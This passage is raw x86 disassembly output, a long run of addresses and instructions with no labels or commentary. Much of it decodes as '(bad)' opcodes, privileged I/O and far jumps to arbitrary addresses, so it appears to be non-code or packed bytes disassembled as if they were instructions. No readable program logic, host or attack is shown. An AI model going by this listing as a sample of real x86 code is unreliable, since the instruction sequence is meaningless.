  419b7f:	mov    ?,ebx
  419b81:	sbb    edx,DWORD PTR [ebx]
  419b83:	pop    es
  419b84:	add    al,0x66
  419b86:	ror    edi,0x1c
  419b89:	cmp    edi,DWORD PTR gs:[ebx]
  419b8c:	pop    ebx
  419b8d:	ds dec esp
  419b8f:	xchg   esp,eax
  419b90:	pop    esi
  419b91:	mov    ecx,0x4afcd6a1
  419b96:	fild   QWORD PTR [ebp+0x13bb68a]
  419b9c:	call   0x488584ad
  419ba1:	inc    esp
  419ba2:	jmp    0x2f512ef3
  419ba7:	fwait
  419ba8:	pop    ss
  419ba9:	das    
  419baa:	ds hlt 
  419bac:	mov    eax,DWORD PTR [eax+0x48]
  419baf:	add    DWORD PTR [edx-0x1a],esi
  419bb2:	hlt    
  419bb3:	ficom  WORD PTR [ebx-0x76]
  419bb6:	call   0x3b7c:0x27e5f15d
  419bbd:	dec    ebx
  419bbe:	(bad)  
  419bbf:	out    dx,al
  419bc0:	inc    ecx
  419bc1:	sub    bh,0x7b
  419bc4:	inc    ecx
  419bc5:	nop
  419bc6:	push   edi
  419bc7:	aad    0x4e
  419bc9:	mov    al,ds:0xbb7a04a8
  419bce:	ret    0xcd41
  419bd1:	popa   
  419bd2:	inc    ecx
  419bd3:	adc    eax,0x847310
  419bd8:	cmp    bh,BYTE PTR [ebx+ebp*1+0x20010f6]
  419bdf:	cli    
  419be0:	fld    QWORD PTR [ebp+edi*1-0x2e]
  419be4:	sbb    ecx,0x732759a7
  419bea:	sahf   
  419beb:	lock add DWORD PTR [edx+0x4092f26d],eax
  419bf2:	int    0x46
  419bf4:	dec    ecx
  419bf5:	sbb    ebp,ecx
  419bf7:	xor    ebx,DWORD PTR [ebx-0x5278d69c]
  419bfd:	fcmovnbe st,st(6)
  419bff:	lea    edi,[eax-0x79d7d1ee]
  419c05:	test   ecx,ebx
  419c07:	cmp    BYTE PTR [edx],bh
  419c09:	inc    ecx
  419c0a:	inc    eax
  419c0b:	cs inc esp
  419c0d:	call   0x385b:0x815647c6
  419c14:	push   0xebafc475
  419c19:	cmp    DWORD PTR [ebx],ecx
  419c1b:	les    edx,FWORD PTR [esi-0x2a]
  419c1e:	xchg   ebx,eax
  419c1f:	fidivr WORD PTR [ebp+0x51]
  419c22:	pop    ss
  419c23:	pop    edi
  419c24:	adc    dl,dh
  419c26:	adc    ebx,eax
  419c28:	imul   esp,DWORD PTR [edi],0xffffff94
  419c2b:	nop
  419c2c:	adc    DWORD PTR [edx],edx
  419c2e:	push   ds
  419c2f:	sbb    dh,BYTE PTR [eax+0x44]
  419c32:	cmc    
  419c33:	test   al,0x37
  419c35:	inc    edi
  419c36:	mov    esi,0xe03f3dc1
  419c3b:	jne    0x419c9f
  419c3d:	xor    eax,0x2fcd85a3
  419c42:	cmp    eax,0x6c15d994
  419c47:	inc    esp
  419c48:	repz pop ebp
  419c4a:	xchg   esi,eax
  419c4b:	mov    al,0xa5
  419c4d:	cld    
  419c4e:	jbe    0x419c6d
  419c50:	(bad)  
  419c51:	mov    ecx,0x4fa456fd
  419c56:	aad    0x8a
  419c58:	push   ecx
  419c59:	sbb    al,0xb2
  419c5b:	mov    ah,0xae
  419c5d:	and    DWORD PTR [ebx],esi
  419c5f:	mov    cl,0x1
  419c61:	xlat   BYTE PTR ds:[ebx]
  419c62:	lds    esi,FWORD PTR [ebp+edi*1+0x7006b517]
  419c69:	mov    bh,0x67
  419c6b:	jmp    0x8f7e:0xc9447a06
  419c72:	or     DWORD PTR cs:[ebx+0x5f],esi
  419c76:	push   ecx
  419c77:	lea    ebx,[ecx]
  419c79:	outs   dx,BYTE PTR ds:[esi]
  419c7a:	add    edi,eax
  419c7c:	scas   al,BYTE PTR es:[edi]
  419c7d:	inc    esi
  419c7e:	repnz ins DWORD PTR es:[edi],dx
  419c80:	sbb    eax,0x85690f64
  419c85:	or     eax,0xb45f3dbb
  419c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c8b:	sbb    BYTE PTR [eax],dl
  419c8d:	cli    
  419c8e:	sbb    eax,0xb4ee8c4
  419c93:	push   eax
  419c94:	xor    BYTE PTR [esi],ch
  419c96:	sub    BYTE PTR [ebx],cl
  419c98:	outs   dx,BYTE PTR ds:[esi]
  419c99:	push   edx
  419c9a:	jmp    0xff45f82a
  419c9f:	sub    al,0xfe
  419ca1:	push   ebp
  419ca2:	(bad)  
  419ca3:	stos   BYTE PTR es:[edi],al
  419ca4:	in     al,dx
  419ca5:	lods   eax,DWORD PTR ds:[esi]
  419ca6:	pop    esp
  419ca7:	sti    
  419ca8:	or     al,0x5b
  419caa:	lods   al,BYTE PTR ds:[esi]
  419cab:	imul   ecx,DWORD PTR [edi+0x4f4db4ad],0xffffffe7
  419cb2:	mov    BYTE PTR [edx+0x6063b375],bh
  419cb8:	adc    ch,BYTE PTR [ecx]
  419cba:	pop    esp
  419cbb:	sahf   
  419cbc:	ss xchg esp,eax
  419cbe:	ins    BYTE PTR es:[edi],dx
  419cbf:	cmp    eax,0x6d6806b6
  419cc4:	dec    esp
  419cc5:	shl    DWORD PTR [edi-0x795cbe31],0xea
  419ccc:	dec    ebx
  419ccd:	pop    edi
  419cce:	adc    ch,BYTE PTR [ebx+ecx*1]
  419cd1:	dec    ecx
  419cd2:	ficom  DWORD PTR [eax-0x1e]
  419cd5:	loopne 0x419c83
  419cd7:	dec    ecx
  419cd8:	mov    bh,0x69
  419cda:	mov    ebp,0x4ba881cc
  419cdf:	pop    edx
  419ce0:	pop    edi
  419ce1:	(bad)  [edx]
  419ce3:	pop    edi
  419ce4:	ins    DWORD PTR es:[edi],dx
  419ce5:	stos   BYTE PTR es:[edi],al
  419ce6:	inc    ebx
  419ce7:	out    0x40,eax
  419ce9:	ins    DWORD PTR es:[edi],dx
  419cea:	xlat   BYTE PTR ds:[ebx]
  419ceb:	lods   al,BYTE PTR ds:[esi]
  419cec:	mov    edi,0x6b3dbd4f
  419cf1:	adc    al,BYTE PTR [ebx-0x4]
  419cf4:	stos   DWORD PTR es:[edi],eax
  419cf5:	ss xchg ebx,eax
  419cf7:	mov    bh,0x63
  419cf9:	pop    ebx
  419cfa:	rol    BYTE PTR [edi],1
  419cfc:	inc    esp
  419cfd:	fbld   TBYTE PTR [ebp+0x6f]
  419d00:	test   eax,0xb8f2636f
  419d05:	pushf  
  419d06:	pop    ds
  419d07:	mov    ecx,0xe2cdb6ea
  419d0c:	shr    DWORD PTR [ebx],1
  419d0e:	call   DWORD PTR ds:0x5305bd56
  419d14:	mov    bh,0xe3
  419d16:	pop    esp
  419d17:	add    eax,DWORD PTR [eax]
  419d19:	repnz lods ax,WORD PTR ds:[esi]
  419d1c:	call   DWORD PTR [ebx]
  419d1e:	xchg   BYTE PTR [eax-0x6ee0f8a2],ah
  419d24:	hlt    
  419d25:	adc    DWORD PTR [eax],0xffffffb9
  419d28:	bound  eax,QWORD PTR [esp+ebx*1]
  419d2b:	das    
  419d2c:	pop    ds
  419d2d:	mov    bh,0x8
  419d2f:	mov    cl,0x1a
  419d31:	mov    edi,0xaf9d7994
  419d36:	and    DWORD PTR [edx-0x38fd9f3c],0xffffffaa
  419d3d:	or     DWORD PTR [esp+esi*8+0x46],0x13e34a83
  419d45:	jle    0x419d88
  419d47:	sub    DWORD PTR [ebx-0x6403af52],0xf6fc8b8c
  419d51:	pop    edx
  419d52:	and    DWORD PTR [ebp+0x2d],esp
  419d55:	mov    dl,BYTE PTR [edx+ebx*1-0x4b42578f]
  419d5c:	jo     0x419d03
  419d5e:	mov    edi,0x124aea58
  419d63:	sbb    eax,DWORD PTR [edi+0x78d1fe98]
  419d69:	adc    ah,al
  419d6b:	cli    
  419d6c:	mov    BYTE PTR [ecx-0x1b],ah
  419d6f:	inc    esi
  419d70:	mov    eax,DWORD PTR [edx+ebx*4+0x399499ad]
  419d77:	mov    BYTE PTR [edx-0x6a236ada],0xce
  419d7e:	imul   edi,DWORD PTR [eax-0x59ae852b],0xa738462
  419d88:	dec    ecx
  419d89:	or     eax,0x5ad22f0b
  419d8e:	pop    ebp
  419d8f:	and    bl,ch
  419d91:	ret    0xe727
  419d94:	adc    esp,DWORD PTR [ebx+ebx*4-0x13]
  419d98:	mov    al,0x80
  419d9a:	adc    BYTE PTR [ebp-0x31cf3e27],dh
  419da0:	adc    dl,BYTE PTR [edx]
  419da2:	popf   
  419da3:	les    ebx,FWORD PTR [edx-0x722f5ee5]
  419da9:	dec    eax
  419daa:	pop    edx
  419dab:	test   al,0xec
  419dad:	jecxz  0x419dd2
  419daf:	xchg   edx,eax
  419db0:	xor    al,0x1c
  419db2:	mov    cs,ebp
  419db4:	xchg   edx,eax
  419db5:	loopne 0x419e31
  419db7:	outs   dx,DWORD PTR ds:[esi]
  419db8:	push   cs
  419db9:	loope  0x419d84
  419dbb:	jp     0x419d46
  419dbd:	add    BYTE PTR [esi],cl
  419dbf:	mov    bh,dl
  419dc1:	aam    0x37
  419dc3:	repnz adc bl,BYTE PTR [edx-0x39]
  419dc7:	es and al,0x41
  419dca:	dec    edx
  419dcb:	fsub   QWORD PTR [esi-0x1c]
  419dce:	les    ebp,FWORD PTR [ebx]
  419dd0:	adc    al,0xb6
  419dd2:	(bad)  
  419dd3:	push   0x0
  419dd5:	dec    eax
  419dd6:	jmp    0xa18b:0x801a64c1
  419ddd:	cmp    al,0x44
  419ddf:	adc    edi,esp
  419de1:	jo     0x419db7
  419de3:	pop    es
  419de4:	mov    eax,ds:0xe9a03c6d
  419de9:	pusha  
  419dea:	cmp    cl,BYTE PTR [ecx-0x5c3340ed]
  419df0:	bound  eax,QWORD PTR [edx+0x8371d6]
  419df6:	xchg   esi,eax
  419df7:	push   ebx
  419df8:	push   ss
  419df9:	cmp    al,cl
  419dfb:	pop    esp
  419dfc:	rcr    BYTE PTR [esi+0x2da1b6c8],cl
  419e02:	push   esi
  419e03:	je     0x419d93
  419e05:	jge    0x419dc6
  419e07:	pop    edx
  419e08:	aad    0x49
  419e0a:	sbb    al,dh
  419e0c:	and    al,0xf4
  419e0e:	fstp   QWORD PTR [esi]
  419e10:	inc    ebx
  419e11:	inc    edi
  419e12:	in     eax,dx
  419e13:	and    al,0xa5
  419e15:	std    
  419e16:	je     0x419e5b
  419e18:	scas   eax,DWORD PTR es:[edi]
  419e19:	add    eax,ebp
  419e1b:	ss pop ebp
  419e1d:	cdq    
  419e1e:	push   edi
  419e1f:	mov    ecx,0x151f575
  419e24:	loopne 0x419e2b
  419e26:	outs   dx,BYTE PTR ds:[esi]
  419e27:	and    dl,BYTE PTR ds:[ecx-0x2e37ce5b]
  419e2e:	mov    ebx,0x23c5ecb2
  419e33:	loopne 0x419e84
  419e35:	imul   esp,ebp,0x974d756e
  419e3b:	dec    esi
  419e3c:	and    dh,ah
  419e3e:	fst    DWORD PTR ds:[edi+0x4edacf29]
  419e45:	fwait
  419e46:	bts    DWORD PTR [edi+eiz*4-0x3],edx
  419e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e4c:	add    BYTE PTR [eax+edx*8],ah
  419e4f:	pop    es
  419e50:	and    ch,BYTE PTR [edi]
  419e52:	(bad)  
  419e54:	in     eax,dx
  419e55:	push   0x339aa7ae
  419e5a:	(bad)  
  419e5b:	mov    esp,0x3eb2fe09
  419e60:	push   0xffffffe8
  419e62:	lods   al,BYTE PTR ds:[esi]
  419e63:	es inc edi
  419e65:	sub    eax,0xe4805893
  419e6a:	mov    edi,0xdb9a2d2
  419e6f:	fs mov eax,0x86c6d838
  419e75:	jbe    0x419e1d
  419e77:	pop    edi
  419e78:	push   edi
  419e79:	cld    
  419e7a:	and    al,0xa6
  419e7c:	fcmovnbe st,st(2)
  419e7e:	cmc    
  419e7f:	pop    edi
  419e80:	xor    al,0xb0
  419e82:	aaa    
  419e83:	sub    al,BYTE PTR [esi]
  419e85:	fwait
  419e86:	jnp    0x419e2b
  419e88:	jae    0x419eb7
  419e8a:	mov    bl,0xcf
  419e8c:	xor    ebx,DWORD PTR [esi-0x6b6a42ef]
  419e92:	sub    dl,ah
  419e94:	test   eax,0xad898b6a
  419e99:	mov    cl,0x8c
  419e9b:	pop    ecx
  419e9c:	pushf  
  419e9d:	aaa    
  419e9e:	das    
  419e9f:	dec    ebp
  419ea0:	pushf  
  419ea1:	xchg   ebx,eax
  419ea2:	sbb    eax,0x3d44a7e7
  419ea7:	aaa    
  419ea8:	push   es
  419ea9:	dec    edx
  419eaa:	hlt    
  419eab:	(bad)  
  419eac:	cmp    eax,0xb8e852ae
  419eb1:	dec    esp
  419eb2:	adc    bl,BYTE PTR [edi-0x6b]
  419eb5:	(bad)  
  419eb6:	adc    al,0xb2
  419eb9:	xchg   esi,eax
  419eba:	mov    al,ds:0x11e595c8
  419ebf:	or     cl,al
  419ec1:	dec    edx
  419ec2:	cmp    BYTE PTR [eax],cl
  419ec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ec5:	sahf   
  419ec6:	jge    0x419efc
  419ec8:	neg    BYTE PTR [esi-0x28]
  419ecb:	out    0xfe,al
  419ecd:	mov    ebx,0xdaaf0afd
  419ed2:	in     eax,0xd7
  419ed4:	jbe    0x419f0d
  419ed6:	cmp    eax,0x888a4065
  419edb:	lea    edx,[edx-0x14c8b7ca]
  419ee1:	je     0x419edf
  419ee3:	(bad)
  419ee7:	jmp    FWORD PTR [esi+ebx*1+0x795c09fd]
  419eee:	inc    edi
  419eef:	jmp    0x419eb1
  419ef1:	pop    esi
  419ef2:	dec    ecx
  419ef3:	je     0x419efb
  419ef5:	cs or  eax,0x8749b926
  419efb:	pop    es
  419efc:	xchg   ecx,eax
  419efd:	ret    
  419efe:	inc    esi
  419eff:	xor    BYTE PTR [eax+eiz*8-0x15],0xc3
  419f04:	daa    
  419f05:	mov    edx,DWORD PTR [ecx+0x5e]
  419f08:	inc    DWORD PTR [ecx-0x66]
  419f0b:	inc    eax
  419f0c:	loope  0x419ef7
  419f0e:	inc    esp
  419f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f10:	or     ch,BYTE PTR [edx-0x22]
  419f13:	sbb    ch,BYTE PTR [ecx-0x5592fbb2]
  419f19:	dec    ebx
  419f1a:	sbb    ebp,esi
  419f1c:	imul   edx,DWORD PTR [ecx+0x75317ebd],0x67491cd9
  419f26:	cld    
  419f27:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  419f29:	jnp    0x419f3b
  419f2b:	shl    dl,cl
  419f2d:	daa    
  419f2e:	test   al,0x31
  419f30:	pop    eax
  419f31:	adc    bh,BYTE PTR ds:0x6932715f
  419f37:	pop    ss
  419f38:	inc    edi
  419f39:	jae    0x419f8d
  419f3b:	ins    DWORD PTR es:[edi],dx
  419f3c:	adc    BYTE PTR [ebx],ah
  419f3e:	jg     0x419f9f
  419f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f41:	mov    ecx,0x4903c973
  419f46:	aas    
  419f47:	ret    0x23b0
  419f4a:	mov    bh,0x12
  419f4c:	and    eax,0x65277ebc
  419f51:	scas   eax,DWORD PTR es:[edi]
  419f52:	jno    0x419f19
  419f54:	jle    0x419f46
  419f56:	mov    cl,0xa
  419f58:	test   al,0x69
  419f5a:	cld    
  419f5b:	sbb    cl,BYTE PTR [eax-0x62298872]
  419f61:	pop    edi
  419f62:	stc    
  419f63:	test   cl,bh
  419f65:	mov    dl,0x23
  419f67:	fwait
  419f68:	sbb    ah,bl
  419f6a:	dec    BYTE PTR [edx+0x18]
  419f6d:	(bad)  
  419f71:	pop    ecx
  419f72:	pop    es
  419f73:	mov    ah,0xef
  419f75:	pusha  
  419f76:	xor    eax,esi
  419f78:	mov    cl,0x63
  419f7a:	rcl    ebx,1
  419f7c:	xor    DWORD PTR [edx+0x5f],ecx
  419f7f:	cmp    bh,BYTE PTR [edx]
  419f81:	mov    esp,0xd52a1075
  419f86:	rcl    DWORD PTR [eax],1
  419f88:	push   esi
  419f89:	jae    0x419f31
  419f8b:	xchg   ebp,eax
  419f8c:	push   ss
  419f8d:	(bad)  
  419f8e:	cmp    DWORD PTR [ebx],edi
  419f90:	inc    ebx
  419f91:	inc    DWORD PTR [edi+0x124f2384]
  419f97:	fld    TBYTE PTR [ebp-0x43]
  419f9a:	mov    ds,ebp
  419f9c:	popf   
  419f9d:	sbb    BYTE PTR [ebp-0x5c],bh
  419fa0:	fwait
  419fa1:	ror    esp,0xc4
  419fa4:	cmp    BYTE PTR [ebx+0x7b1b5203],al
  419faa:	inc    ecx
  419fab:	aaa    
  419fac:	arpl   di,cx
  419fae:	xor    ch,BYTE PTR [edx+0x416dca17]
  419fb4:	ds or  eax,0xe4b0ba8
  419fba:	ins    DWORD PTR es:[edi],dx
  419fbb:	loop   0x419f48
  419fbd:	adc    eax,0x9b76548a
  419fc2:	in     eax,0xcb
  419fc4:	test   BYTE PTR [ebp+0x37],ah
  419fc7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fc9:	add    eax,DWORD PTR [edi-0x53fd5f38]
  419fcf:	sbb    DWORD PTR [edx-0x2473fa95],0xbb5adb48
  419fd9:	int3   
  419fda:	mov    dl,BYTE PTR [edx-0x67]
  419fdd:	iret   
  419fde:	gs jnp 0x419f8c
  419fe1:	add    al,0x38
  419fe3:	push   edx
  419fe4:	push   edx
  419fe5:	popf   
  419fe6:	mov    DWORD PTR ds:0x9ea7b541,edi
  419fec:	add    ecx,ebp
  419fee:	repz pop edi
  419ff0:	pop    ss
  419ff1:	(bad)  
  419ff2:	out    dx,al
  419ff3:	fs mov ebx,0xef457c4b
  419ff9:	out    0xa6,eax
  419ffb:	clc    
  419ffc:	int    0xaf
  419ffe:	jbe    0x41a015
  41a000:	inc    ebp
  41a001:	jmp    0xe2e4:0x306761bc
  41a008:	sbb    al,0x66
  41a00a:	daa    
  41a00b:	inc    BYTE PTR [ecx+edx*1-0x7a6f49ec]
  41a012:	push   ebx
  41a013:	sbb    eax,0x8a7fa99f
  41a018:	pop    ds
  41a019:	mov    edi,DWORD PTR [eax]
  41a01b:	xchg   ecx,eax
  41a01c:	push   es
  41a01d:	mov    edx,0x64b63443
  41a022:	cmp    al,0x6c
  41a024:	mov    edi,0xda5a50dc
  41a029:	pop    ebp
  41a02a:	pushf  
  41a02b:	dec    BYTE PTR [ebx]
  41a02d:	aam    0x5f
  41a02f:	bound  esp,QWORD PTR ds:0x4e862da8
  41a035:	add    eax,0x7e57af78
  41a03a:	(bad)  
  41a03b:	xchg   ebx,eax
  41a03c:	daa    
  41a03d:	es push ecx
  41a03f:	push   0x3b
  41a041:	mov    ch,bh
  41a043:	sbb    al,0x58
  41a045:	push   0x70
  41a047:	repnz imul edi,DWORD PTR [ebx],0xaeb37c12
  41a04e:	and    ebp,DWORD PTR [ebp-0x76]
  41a051:	fld    QWORD PTR [ebp+ebx*8-0x4385259]
  41a058:	inc    DWORD PTR [ebx-0x68edbbec]
  41a05e:	sub    al,0xf1
  41a060:	cmp    eax,ecx
  41a062:	aas    
  41a063:	dec    edx
  41a064:	lods   al,BYTE PTR ds:[esi]
  41a065:	int3   
  41a066:	push   esp
  41a067:	mov    ebx,0xb5f5ba87
  41a06c:	(bad)  
  41a06d:	loopne 0x41a036
  41a06f:	fcom   DWORD PTR [ebx+0x58]
  41a072:	adc    BYTE PTR [edi+ebx*2+0x28],bh
  41a076:	xor    DWORD PTR [ebx+0x36],eax
  41a079:	xlat   BYTE PTR ds:[ebx]
  41a07a:	mov    cl,0xea
  41a07c:	pop    ss
  41a07d:	retf   
  41a07e:	xor    BYTE PTR [ebx+0x641b9bd0],ch
  41a084:	push   edi
  41a085:	xacquire xchg DWORD PTR [ebx+edx*8-0x2b],ebx
  41a08a:	jl     0x41a04b
  41a08c:	dec    esi
  41a08d:	mov    cl,0x9c
  41a08f:	adc    al,0xdd
  41a091:	mov    al,0xec
  41a093:	stos   BYTE PTR es:[edi],al
  41a094:	popf   
  41a095:	js     0x41a0ba
  41a097:	sbb    DWORD PTR [esi-0x52],edi
  41a09a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a09b:	stos   DWORD PTR es:[edi],eax
  41a09c:	call   ebx
  41a09e:	add    DWORD PTR ds:0x4cc04a6c,0xf18941e2
  41a0a8:	pop    edx
  41a0a9:	cwde   
  41a0aa:	jmp    0xe9a1:0x61889bd3
  41a0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0b2:	sub    al,0xef
  41a0b4:	dec    eax
  41a0b5:	enter  0x237b,0xee
  41a0b9:	gs es inc ebx
  41a0bc:	ja     0x41a0d3
  41a0be:	ror    ebp,cl
  41a0c0:	pop    ebp
  41a0c1:	lds    esi,FWORD PTR [ebp-0x1a]
  41a0c4:	outs   dx,BYTE PTR ds:[esi]
  41a0c5:	sub    DWORD PTR [edi-0x65],esi
  41a0c8:	cwde   
  41a0c9:	pop    edi
  41a0ca:	add    bl,BYTE PTR [ebx-0x13]
  41a0cd:	adc    BYTE PTR [esi],cl
  41a0cf:	xchg   edi,eax
  41a0d0:	jne    0x41a136
  41a0d2:	jnp    0x41a066
  41a0d4:	mov    esp,0xae06c5b9
  41a0d9:	push   eax
  41a0da:	in     al,dx
  41a0db:	aad    0x5c
  41a0dd:	mov    ch,0x2f
  41a0df:	stos   BYTE PTR es:[edi],al
  41a0e0:	retf   0x9b9d
  41a0e3:	push   ebp
  41a0e4:	sub    bl,cl
  41a0e6:	xchg   BYTE PTR [ebx],al
  41a0e8:	mov    ch,0x72
  41a0ea:	das    
  41a0eb:	mov    ds,WORD PTR [edx]
  41a0ed:	aad    0x1e
  41a0ef:	(bad)  
  41a0f0:	sub    eax,0x5e994b2e
  41a0f5:	popf   
  41a0f6:	out    0xb,eax
  41a0f8:	lahf   
  41a0f9:	(bad)  
  41a0fa:	or     DWORD PTR [eax+esi*8],ecx
  41a0fd:	jecxz  0x41a080
  41a0ff:	aaa    
  41a100:	dec    ebp
  41a101:	xchg   esi,eax
  41a102:	mov    esi,0xa50a27fe
  41a107:	mov    al,BYTE PTR [ecx+0x127297bb]
  41a10d:	sbb    ah,0x30
  41a110:	in     eax,dx
  41a111:	adc    BYTE PTR [edx],al
  41a113:	pop    ds
  41a114:	wrmsr  
  41a116:	aas    
  41a117:	outs   dx,BYTE PTR ds:[esi]
  41a118:	(bad)  
  41a119:	icebp  
  41a11a:	mov    bl,ch
  41a11c:	je     0x41a0de
  41a11e:	jno    0x41a194
  41a120:	pop    edx
  41a121:	inc    esp
  41a122:	push   es
  41a123:	popf   
  41a124:	fcomi  st,st(3)
  41a126:	inc    edx
  41a127:	pop    eax
  41a128:	cmc    
  41a129:	push   esi
  41a12a:	mov    edi,0x61e55983
  41a12f:	add    BYTE PTR [ebx],cl
  41a131:	xor    bh,BYTE PTR [edi]
  41a133:	jb     0x41a199
  41a135:	push   edx
  41a136:	lods   al,BYTE PTR ds:[esi]
  41a137:	or     ebp,DWORD PTR [edx-0x5d]
  41a13a:	inc    esi
  41a13b:	enter  0x9461,0x23
  41a13f:	clc    
  41a140:	jg     0x41a0fc
  41a142:	jmp    0x5f2b:0xa25cbce2
  41a149:	adc    dh,BYTE PTR [ecx-0x39074c5e]
  41a14f:	adc    cl,al
  41a151:	pop    ebx
  41a152:	sbb    dl,cl
  41a154:	ret    0x3866
  41a157:	int3   
  41a158:	std    
  41a159:	popf   
  41a15a:	imul   ecx,DWORD PTR [ebx+0x6f],0x45e950dd
  41a161:	or     bl,bl
  41a163:	mov    ch,0xc3
  41a165:	sahf   
  41a166:	mov    es,WORD PTR [edx+0x6bbf0c09]
  41a16c:	jp     0x41a1af
  41a16e:	mov    dl,0x3f
  41a170:	daa    
  41a171:	inc    esi
  41a172:	fcomp  DWORD PTR [eax+0x30]
  41a175:	ret    
  41a176:	inc    eax
  41a177:	push   esi
  41a178:	fnstenv [esi+0x41]
  41a17b:	jp     0x41a119
  41a17d:	sbb    dh,BYTE PTR es:[eax]
  41a180:	mov    eax,0x1fb23dc8
  41a185:	dec    edi
  41a186:	pop    edi
  41a187:	xor    eax,0x97040996
  41a18c:	xchg   esi,eax
  41a18d:	lods   al,BYTE PTR ds:[esi]
  41a18e:	dec    esi
  41a18f:	push   esp
  41a190:	mov    al,0x51
  41a192:	(bad)  
  41a193:	adc    bl,BYTE PTR [ecx-0x401910ef]
  41a199:	xchg   esp,eax
  41a19a:	not    DWORD PTR [ebp-0x3c]
  41a19d:	stos   BYTE PTR es:[edi],al
  41a19e:	fdivr  QWORD PTR [ecx-0x4ab4deb5]
  41a1a4:	pusha  
  41a1a5:	and    eax,DWORD PTR [eax]
  41a1a7:	ins    DWORD PTR es:[edi],dx
  41a1a8:	mov    ch,0xba
  41a1aa:	mov    ds,ebx
  41a1ac:	xchg   esp,eax
  41a1ad:	or     BYTE PTR [ebx-0x710f5e97],dh
  41a1b3:	fbstp  TBYTE PTR [edi]
  41a1b5:	sub    DWORD PTR [esi+edx*2-0x53],eax
  41a1b9:	int3   
  41a1ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1bb:	push   0xfffffff6
  41a1bd:	pop    esp
  41a1be:	std    
  41a1bf:	std    
  41a1c0:	test   eax,0xf24dd419
  41a1c5:	das    
  41a1c6:	or     ecx,DWORD PTR ds:0x84c3e398
  41a1cc:	(bad)  
  41a1cd:	call   0xacb79de7
  41a1d2:	lods   al,BYTE PTR ds:[esi]
  41a1d3:	imul   edi,DWORD PTR [esi-0x70d16099],0xfffffffe
  41a1da:	in     eax,0xd
  41a1dc:	push   es
  41a1dd:	js     0x41a1f3
  41a1df:	fidiv  DWORD PTR [ebp+0xe3b21c2]
  41a1e5:	stos   BYTE PTR es:[edi],al
  41a1e6:	xchg   esp,eax
  41a1e7:	xchg   esp,eax
  41a1e8:	fld    DWORD PTR [esi+0xc1dd82a]
  41a1ee:	out    0xff,al
  41a1f0:	cli    
  41a1f1:	xor    BYTE PTR [eax+0x3d],dl
  41a1f4:	test   edx,ebp
  41a1f6:	mov    esi,0xeea07923
  41a1fb:	les    edi,FWORD PTR es:[ebp-0x5a]
  41a1ff:	mov    al,ds:0xcbd2758a
  41a204:	and    eax,0xcc8b654d
  41a209:	(bad)  
  41a20a:	popf   
  41a20b:	lods   al,BYTE PTR ds:[esi]
  41a20c:	je     0x41a28a
  41a20e:	sbb    edx,DWORD PTR ds:0x1f46993f
  41a214:	sbb    eax,0x56da6816
  41a21a:	lea    eax,[esi+0x878589d]
  41a220:	addr16 pop ebx
  41a222:	jg     0x41a1c1
  41a224:	hlt    
  41a225:	mov    edi,DWORD PTR [ebx]
  41a227:	aam    0xeb
  41a229:	ins    BYTE PTR es:[edi],dx
  41a22a:	xchg   ebp,eax
  41a22b:	push   ebp
  41a22c:	add    eax,0xd06604a8
  41a231:	fsubr  QWORD PTR [edi-0x574b222c]
  41a237:	rcr    DWORD PTR ds:0x9fc8a9f5,cl
  41a23d:	xchg   ebx,eax
  41a23e:	adc    eax,0xe2119627
  41a243:	outs   dx,BYTE PTR ds:[esi]
  41a244:	fs in  eax,0xb
  41a247:	sti    
  41a248:	mov    eax,0x76ab7e5d
  41a24d:	out    0x49,eax
  41a24f:	shl    bl,0x3e
  41a252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a253:	mov    al,0x4c
  41a255:	inc    ecx
  41a256:	mov    esp,0x60715fd7
  41a25b:	inc    edx
  41a25c:	sbb    DWORD PTR [eax],eax
  41a25e:	in     eax,0x54
  41a260:	mov    ds,edi
  41a262:	lahf   
  41a263:	sbb    BYTE PTR [ebp+ebp*1+0x6b],dl
  41a267:	or     eax,0x22809d92
  41a26c:	sbb    cl,BYTE PTR [ebx+ecx*2+0x4a4540cf]
  41a273:	jl     0x41a2e5
  41a275:	push   ecx
  41a276:	inc    ebp
  41a277:	cdq    
  41a278:	or     eax,0xda4b70f0
  41a27d:	lods   eax,DWORD PTR ds:[esi]
  41a27e:	lods   al,BYTE PTR ds:[esi]
  41a27f:	sub    BYTE PTR [edx+0x35],al
  41a282:	fst    QWORD PTR [edx-0x2ee61643]
  41a288:	pop    DWORD PTR [edx]
  41a28a:	inc    esp
  41a28b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a28c:	jl     0x41a293
  41a28e:	mov    edx,0x60317cb9
  41a293:	js     0x41a22f
  41a295:	mov    ds:0x2f204580,eax
  41a29a:	div    edx
  41a29c:	ins    BYTE PTR es:[edi],dx
  41a29d:	push   edi
  41a29e:	xchg   esi,eax
  41a29f:	push   ebx
  41a2a0:	pop    eax
  41a2a1:	add    DWORD PTR [ecx],esp
  41a2a3:	jg     0x41a2e4
  41a2a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2a6:	xchg   BYTE PTR [ebp+0x680de031],ch
  41a2ac:	sbb    cl,BYTE PTR [ebx+0x39f4ba97]
  41a2b2:	arpl   WORD PTR [ebp+0xf42f04],si
  41a2b8:	sub    al,0x55
  41a2ba:	sub    al,0xa9
  41a2bc:	adc    eax,0xe78a9548
  41a2c1:	cmp    ebp,DWORD PTR [esi-0x58]
  41a2c4:	add    eax,0x8e38eb24
  41a2c9:	ret    
  41a2ca:	repz push 0x5
  41a2cd:	jmp    0x93:0xa5cc29f9
  41a2d4:	popf   
  41a2d5:	jbe    0x41a25a
  41a2d7:	leave  
  41a2d8:	ss xchg ebp,eax
  41a2da:	push   es
  41a2db:	xchg   edx,eax
  41a2dc:	cmp    al,0x44
  41a2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2df:	mov    bh,0xd6
  41a2e1:	ja     0x41a2f0
  41a2e3:	arpl   WORD PTR [edi+ecx*4+0x8],ax
